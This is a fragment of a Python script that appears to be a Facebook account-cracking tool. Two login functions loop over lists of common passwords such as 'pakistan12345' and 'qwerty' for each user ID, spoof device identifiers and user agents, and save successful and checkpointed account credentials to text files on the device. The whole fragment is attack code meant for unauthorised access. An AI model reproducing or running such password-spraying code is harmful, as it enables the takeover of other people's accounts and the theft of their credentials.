...
def login1(uid, tl):
    ...
    try:
        ...
        sys.stdout.flush()        
        ua = windows()
        for pw in ('pakistan12345', 'india123456', 'qwerty', 'password'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
            ...
            if 'session_key' in res:
                ...
                open('/sdcard/2009-2022-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break           
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r{r}SAMEER-XD-OK {p}➤ {w}{uid} {r}|{w} {pw}")
                open('/sdcard/2009-2022-CP.txt', 'a').write(f"{uid}|{pw}\n")
                cps.append(uid)
                break          
            else:
                continue
...
def login2(uid, tl):
    ...
    try:
        ...
        sys.stdout.flush()
        for pw in ["Pakistan12345", "pakistan12345678", "india12345678", "india123456789", "afghan123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
            headers = {
